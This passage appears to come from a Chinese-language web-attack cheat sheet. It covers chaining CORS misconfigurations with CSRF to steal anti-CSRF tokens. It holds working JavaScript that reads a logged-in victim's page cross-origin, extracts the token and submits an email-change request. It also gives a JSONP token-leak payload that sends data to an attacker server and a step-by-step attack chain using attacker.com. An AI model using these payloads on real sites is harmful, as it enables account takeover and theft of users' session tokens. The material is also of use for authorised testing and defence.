## 八、CORS+CSRF链式利用与Token泄露通道

### 8.1 CORS错误配置读取Token
```
前提：目标响应含以下任一配置
- Access-Control-Allow-Origin: <反射Origin> + Access-Control-Allow-Credentials: true
- Access-Control-Allow-Origin: * （无凭据场景，读公开Token）
- Access-Control-Allow-Origin: null
- 正则缺陷（含子域通配过宽）

利用（读取页面meta token或接口响应）：
fetch('https://target.com/profile', {credentials:'include'})
  .then(r => r.text()).then(t => {
    // 提取meta csrf-token 或响应中的token
    var token = <REDACTED>"csrf-token" content="([^"]+)"/)[1];
    // 发送带token的请求
    fetch('https://target.com/api/change-email', {
      method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json','X-CSRF-Token':token},
      body: JSON.stringify({email:'<EMAIL-REDACTED>'})
    });
  });
```

### 8.2 Token在Header但可通过CORS/JSONP泄露的场景
```
场景1：Token放Header（X-CSRF-Token），但页面含<meta csrf-token>且CORS放行 → 读meta
场景2：Token放Header，但存在JSONP接口返回token（callback=fn包裹）→ <script src>跨域加载
场景3：Token放Header，但错误响应/401响应体回显（CORS读取错误体）
场景4：Angular/Spring风格——Token在XSRF-TOKEN Cookie（非HttpOnly）：
       攻击者站点无法直接读跨域Cookie，但若攻击者可注入Cookie（第七章）→ 浏览器自动同步Header
场景5：CORS放行+页面存在embedding token的API（/api/csrf、/api/session返回token）→ 直接fetch读

JSONP泄露Payload：
<script>
function leak(token){ /* 发送到攻击者服务器 */ }
</script>
<script src="https://target.com/api/csrf-token?callback=leak"></script>
```

### 8.3 校验"Header存在即可"绕过
```javascript
// 服务端实现若为 if(req.headers['x-requested-with']) 即放行：
// fetch带任意值的自定义头即可（跨站fetch自定义头触发预检→需CORS，见8.1）
// 或表单直接提交同名头不可行——纯表单无法带自定义头，因此该缺陷常配合：
// 1. CORS预检放行（Allow-Headers含X-Requested-With）
// 2. Flash/老插件
// 3. 服务端代理去头/双写头混淆
```

### 8.4 CORS+CSRF完整链（Token读取→利用）
```
1. 测绘：向 /api/session 或 /profile 发跨域fetch（Origin: https://attacker.com）
2. 观察响应：是否含 Access-Control-Allow-Origin: https://attacker.com + Allow-Credentials: true
3. 若是 → 读取Token所在页面/接口
4. 用Token+credentials:'include'发送状态改变请求（自定义Header+JSON均可行）
5. 若CORS仅放行某子域 → 检查该子域是否可接管/有XSS（链式）
6. 注意：CORS读取不到HttpOnly Cookie，但Token一般在meta/接口响应/非HttpOnly Cookie中
```

